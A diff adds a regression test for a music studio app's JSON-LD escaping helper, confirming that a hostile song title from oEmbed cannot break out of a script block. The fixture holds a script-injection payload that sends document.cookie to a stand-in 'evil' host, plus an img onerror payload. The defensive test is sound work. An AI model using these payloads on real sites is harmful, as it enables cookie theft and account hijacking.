@@ -59,6 +59,7 @@ import { scaleClipsForLock, stretchedIdFor } from "../lib/studio/lock-pitch";
 import { makeClipId, reserveClipIds, resetClipIds } from "../lib/studio/clip-ids";
 import { reachableBufferIds } from "../lib/studio/buffer-store";
 import { loadArrangement, saveArrangement } from "../lib/studio/session";
+import { jsonLdString } from "../lib/seo/jsonld";
 
 const DRY_PARAMS: RemixParams = {
   speed: 1,
@@ -1208,4 +1209,21 @@ test("a clip's effect rides along with its schedule", () => {
     1.5,
   );
   assert.equal(fast[0]?.effect, "underwater");
+});
+
+test("jsonLdString cannot be broken out of by a hostile title", () => {
+  // Song titles come from platform oEmbed responses — whatever someone named
+  // their video. The HTML parser ends a <script> at the first "</script" it
+  // sees regardless of JSON string context, and JSON.stringify leaves "<"
+  // alone, so this exact payload used to escape the JSON-LD block.
+  const hostile = {
+    name: `x</script><script>fetch('//evil/'+document.cookie)</script>`,
+    byArtist: `a & b <img onerror=alert(1)>`,
+  };
+  const out = jsonLdString(hostile);
+  assert.ok(!out.includes("<"), "no raw < may survive");
+  assert.ok(!out.includes(">"), "no raw > may survive");
+  assert.ok(!out.includes("&"), "no raw & may survive");
+  // And it is still the same data — the escapes are valid JSON.
+  assert.deepEqual(JSON.parse(out), hostile);
 });
